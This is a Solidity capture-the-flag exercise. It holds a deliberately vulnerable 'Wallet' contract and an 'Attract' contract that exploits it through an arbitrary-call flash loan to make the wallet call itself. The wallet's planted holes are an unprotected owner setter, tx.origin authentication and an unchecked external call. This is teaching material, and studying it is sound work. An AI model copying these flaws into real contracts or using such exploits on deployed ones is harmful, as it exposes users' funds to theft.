// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;
// 考点：1.owner。2.origin。
contract Attract{
    address payable wallet;
    constructor(address payable addr) public {
        wallet = addr;
    }
    //外部调用beOwner使owner为tx
    function attract() public payable {
        bytes memory data = abi.encodeWithSignature("isCompleted()");
        Wallet(wallet).initChallange{value : 100}();
        Wallet(wallet).flashLoan(wallet, 10, data);
    }
    receive() external payable{}
}


contract Wallet {
    address owner;
    uint256 public score;
    bool private init;
    constructor() public payable{
        owner = address(this);
    }
    function beOwner() public {
        owner = msg.sender;
    }
    function initChallange() public payable{
        require(msg.value == 100);
        init = true;
    }
    function flashLoan(address payable target,uint256 amount,bytes memory data)public payable{

        uint256 balanceBefore = address(this).balance;
        require(balanceBefore>amount,"amount must letter than balance");

        payable(target).transfer(amount);
        (bool success,) =payable(target).call(data);
        require(success,"flashLoan call failed");

        uint256 balanceAfter = address(this).balance;
        require(balanceAfter>=balanceBefore,"flashloan hasn't been paid back");
    }
    function isCompleted() public {
        score = 0;
        if(tx.origin == owner){
            score += 25;
        }
        if(msg.sender == address(this) && init){
            score += 75;
        }
    }

    fallback() external payable {

    }
}